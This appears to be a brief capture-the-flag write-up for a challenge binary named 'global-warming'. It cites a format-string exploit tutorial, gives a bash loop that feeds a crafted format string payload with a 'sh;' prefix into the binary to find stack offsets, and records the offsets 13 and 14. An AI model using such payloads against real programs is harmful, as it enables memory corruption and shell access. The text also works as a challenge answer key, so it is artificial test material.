# Global Warming

Following <https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html>

```sh
for ((i=1;i<15;i++)); do echo $i; echo "sh;#AAAABBBB%00000x%${i}\$hp%00000x%$((i+1))\$hp" | ./global-warming; echo ;done
```

Offsets - `13 14`


